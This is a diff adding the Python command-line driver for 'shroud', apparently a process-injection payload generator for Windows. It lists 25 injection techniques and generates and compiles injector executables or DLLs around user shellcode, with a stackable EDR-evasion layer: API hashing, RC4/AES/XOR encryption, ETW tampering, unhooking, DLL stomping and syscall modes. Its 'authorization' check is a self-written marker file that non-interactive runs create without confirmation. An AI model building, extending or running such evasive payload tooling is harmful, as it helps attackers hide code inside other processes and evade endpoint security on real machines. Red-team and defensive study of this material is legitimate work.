@@ -1,0 +1,257 @@
+#!/usr/bin/env python3
+"""
+shroud — process-injection payload generator for authorized internal pentesting.
+
+Builds Windows payloads around the 25 techniques of the Offensive-Panda
+"Process Injection Series" (https://offensive-panda.github.io/ProcessInjectionTechniques/)
+with a composable EDR-evasion stack.
+
+    shroud authorize
+    shroud list [--category CAT]
+    shroud show <id>
+    shroud generate <id> -s shellcode.bin -e dynamic-api,rc4,etw
+    shroud build   <project-dir>
+
+AUTHORIZED INTERNAL PENTEST USE ONLY. You are responsible for scope and consent.
+"""
+
+import argparse
+import os
+import sys
+
+HERE = os.path.dirname(os.path.abspath(__file__))
+sys.path.insert(0, HERE)
+
+from lib import registry, evasion, payload, builder  # noqa: E402
+
+AUTH_MARKER = os.path.expanduser("~/.shroud_authorized")
+
+BANNER = (
+    "\033[91m"
+    "==============================================================\n"
+    " shroud — process-injection payload generator\n"
+    " AUTHORIZED INTERNAL PENTEST / RED-TEAM USE ONLY.\n"
+    " You are responsible for engagement scope and written consent.\n"
+    "=============================================================="
+    "\033[0m"
+)
+
+
+# --------------------------------------------------------------------------
+def is_authorized() -> bool:
+    return os.path.isfile(AUTH_MARKER)
+
+
+def require_auth():
+    if not is_authorized():
+        print(BANNER, file=sys.stderr)
+        print("\n\033[91mNot authorized.\033[0m Run `shroud authorize` first and confirm "
+              "you have written authorization for the target environment.\n",
+              file=sys.stderr)
+        sys.exit(2)
+
+
+# --------------------------------------------------------------------------
+def cmd_authorize(_args):
+    print(BANNER)
+    print()
+    print("By running `shroud authorize` you confirm that you will only use this")
+    print("tool against systems you own or have explicit written authorization to")
+    print("test, in accordance with applicable law and your engagement scope.")
+    print()
+    if not sys.stdin.isatty():
+        print("(non-interactive: recording marker)", file=sys.stderr)
+    else:
+        resp = input("Type YES to confirm: ").strip()
+        if resp != "YES":
+            print("aborted.", file=sys.stderr)
+            sys.exit(1)
+    with open(AUTH_MARKER, "w") as fh:
+        fh.write("authorized\n")
+    os.chmod(AUTH_MARKER, 0o600)
+    print("\n\033[92mAuthorization recorded at %s\033[0m" % AUTH_MARKER)
+
+
+def cmd_list(args):
+    print("\nProcess Injection Series — %d techniques (%d code-generated)\n"
+          % (len(registry.all_techniques()), len(registry.implemented())))
+    if args.category:
+        groups = {args.category: registry.by_category().get(args.category, [])}
+    else:
+        groups = registry.by_category()
+    for cat, techs in groups.items():
+        if not techs:
+            continue
+        print("\033[93m%-12s\033[0m %s" % (cat.upper(), registry.CATEGORIES[cat]))
+        for t in techs:
+            mark = "\033[92m*\033[0m" if t["implemented"] else "\033[90m.\033[0m"
+            print("  %s %-5s %-44s [%s] %s"
+                  % (mark, t["id"].upper(), t["name"][:44], t["subtech"],
+                     ", ".join(t["tags"][:2])))
+        print()
+
+
+def cmd_show(args):
+    t = registry.resolve(args.id)
+    if not t:
+        print("unknown technique: %s" % args.id, file=sys.stderr)
+        sys.exit(1)
+    print(BANNER)
+    print()
+    print("\033[1m%s — %s\033[0m" % (t["id"].upper(), t["name"]))
+    print("category : %s   MITRE: %s   %s"
+          % (t["category"], t["subtech"],
+             "\033[92m(code-generated)\033[0m" if t["implemented"]
+             else "\033[90m(scaffold)\033[0m"))
+    print("tags     : %s" % ", ".join(t["tags"]))
+    print()
+    print(t["summary"])
+    print()
+    print("\033[1mFlow\033[0m")
+    for i, s in enumerate(t["flow"], 1):
+        print("  %d. %s" % (i, s))
+    print()
+    print("\033[1mNotes\033[0m")
+    print("  " + t["notes"])
+
+
+def cmd_generate(args):
+    require_auth()
+    print(BANNER)
+    t = registry.resolve(args.id)
+    if not t:
+        print("unknown technique: %s" % args.id, file=sys.stderr)
+        sys.exit(1)
+
+    flags = set()
+    if args.evasion:
+        flags = {e.strip() for e in args.evasion.split(",") if e.strip()}
+    # pe03/pe17 are pe02 + dynamic-api by definition
+    if t["id"] in ("pe03", "pe17"):
+        flags.add("dynamic-api")
+    valid = {o for o, _ in evasion.OPTIONS}
+    bad = flags - valid
+    if bad:
+        print("unknown evasion layer(s): %s\nvalid: %s" % (", ".join(bad), ", ".join(sorted(valid))),
+              file=sys.stderr)
+        sys.exit(1)
+
+    # aes/rc4/xor are mutually exclusive at-rest layers (priority aes > rc4 > xor)
+    crypto_on = [c for c in ("aes", "rc4", "xor") if c in flags]
+    if len(crypto_on) > 1:
+        keep = crypto_on[0]
+        for c in crypto_on[1:]:
+            flags.discard(c)
+        print("at-rest layers %s conflict; keeping '%s'." % (",".join(crypto_on), keep),
+              file=sys.stderr)
+    # unhook-kd supersedes unhook (stealthier, no disk read)
+    if "unhook-kd" in flags and "unhook" in flags:
+        flags.discard("unhook")
+
+    params = {
+        "target": args.process,
+        "host": args.host,
+        "dll": args.dll,
+        "shellcode": args.shellcode,
+        "demo": not bool(args.shellcode),
+        "aes_key": args.aes_key,
+        "xor_key": args.xor_key,
+        "rc4_key": args.rc4_key,
+        "hash": args.hash,
+        "stomp_dll": args.stomp_dll,
+    }
+
+    out_dir = args.out or os.path.join("out", t["id"])
+
+    print("\n\033[1mGenerating %s — %s\033[0m" % (t["id"].upper(), t["name"]))
+    print("  format      : %s" % args.format)
+    print("  evasion     : %s" % (", ".join(sorted(flags)) if flags else "(none)"))
+    print("  shellcode   : %s" % (args.shellcode or "(demo stub)"))
+    print("  output dir  : %s" % out_dir)
+
+    result = payload.assemble(
+        t, params=params, flags=flags, out_dir=out_dir,
+        fmt=args.format, build=(not args.no_build and args.format != "c"),
+    )
+    print("\n\033[92mwrote project -> %s\033[0m" % result["dir"])
+    for f in result["files"]:
+        print("   - %s" % f)
+    if result["crypto"]:
+        print("  payload encrypted at rest with: %s" % result["crypto"])
+    if result["syscall_mode"]:
+        print("  syscall mode: %s" % result["syscall_mode"])
+    if result["built"]:
+        b = result["built"]
+        print("\n\033[92mbuilt -> %s\033[0m (%d bytes)" % (b["output"], b["size"]))
+    elif args.no_build or args.format == "c":
+        print("\n(source only — %s)" % ("format=c" if args.format == "c" else "--no-build"))
+        print("compile with:  cd %s && make" % out_dir)
+    else:
+        print("\n\033[93mbuild skipped\033[0m (set up mingw-w64, then run `make` in the dir)")
+
+
+def cmd_build(args):
+    require_auth()
+    if not os.path.isdir(args.dir):
+        print("no such directory: %s" % args.dir, file=sys.stderr)
+        sys.exit(1)
+    print(BANNER, "\nbuilding %s ..." % args.dir)
+    try:
+        res = builder.build(args.dir, fmt=args.format)
+    except builder.BuildError as e:
+        print("\033[91m%s\033[0m" % e, file=sys.stderr)
+        sys.exit(1)
+    print("\033[92mOK\033[0m -> %s (%d bytes)" % (res["output"], res["size"]))
+
+
+# --------------------------------------------------------------------------
+def main():
+    p = argparse.ArgumentParser(
+        prog="shroud",
+        description="process-injection payload generator (authorized internal pentest use)",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=__doc__,
+    )
+    sub = p.add_subparsers(dest="cmd", required=True)
+
+    sub.add_parser("authorize", help="record authorization marker (required once)").set_defaults(func=cmd_authorize)
+
+    pl = sub.add_parser("list", help="list all techniques")
+    pl.add_argument("--category", help="filter by category (e.g. syscalls, hollowing)")
+    pl.set_defaults(func=cmd_list)
+
+    ps = sub.add_parser("show", help="show one technique")
+    ps.add_argument("id", help="pe08 / 8 / 'process hollowing'")
+    ps.set_defaults(func=cmd_show)
+
+    pg = sub.add_parser("generate", help="generate a payload project")
+    pg.add_argument("id", help="technique id (pe08), number (8), or name")
+    pg.add_argument("-s", "--shellcode", help="raw shellcode file")
+    pg.add_argument("-o", "--out", help="output directory (default ./out/<id>)")
+    pg.add_argument("-f", "--format", choices=["exe", "dll", "c"], default="exe")
+    pg.add_argument("-e", "--evasion",
+                    help="comma list: " + ", ".join(o for o, _ in evasion.OPTIONS))
+    pg.add_argument("--aes-key", help="hex key for aes layer (32 bytes; random if omitted)")
+    pg.add_argument("--xor-key", help="hex key for xor layer (random if omitted)")
+    pg.add_argument("--rc4-key", help="hex key for rc4 layer (random if omitted)")
+    pg.add_argument("--hash", choices=["fnv", "ror13"], default="fnv",
+                    help="hash algo for dynamic-api (default fnv; ror13 is legacy/signatured)")
+    pg.add_argument("--stomp-dll", default=None,
+                    help="legit DLL to stomp into for -e stomp (default xpsprint.dll)")
+    pg.add_argument("--process", default=None, help="remote target process name")
+    pg.add_argument("--host", default=None, help="host binary for hollowing (default notepad.exe)")
+    pg.add_argument("--dll", default=None, help="DLL path (pe05)")
+    pg.add_argument("--no-build", action="store_true", help="generate source only")
+    pg.set_defaults(func=cmd_generate)
+
+    pb = sub.add_parser("build", help="(re)build a generated project")
+    pb.add_argument("dir", help="project directory")
+    pb.add_argument("-f", "--format", choices=["exe", "dll"], default="exe")
+    pb.set_defaults(func=cmd_build)
+
+    args = p.parse_args()
+    args.func(args)
+
+
+if __name__ == "__main__":
+    main()
